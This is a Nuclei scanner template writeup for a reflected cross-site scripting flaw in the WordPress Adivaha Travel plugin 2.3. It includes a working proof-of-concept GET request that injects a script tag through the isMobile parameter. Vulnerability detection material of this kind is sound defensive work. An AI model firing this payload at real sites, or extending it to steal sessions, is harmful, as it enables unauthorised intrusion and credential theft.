# Nuclei Template: WordPress Adivaha Travel Plugin 2.3 - Cross-Site Scripting
**Template ID:** wp-adivaha-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`wp-adivaha-xss.yaml`)

## Vulnerability Information & PoC

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/mobile-app/v3/?pid=77A89299&isMobile=%20clq95%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Elb1ra
```

## References
- https://www.exploit-db.com/exploits/51663
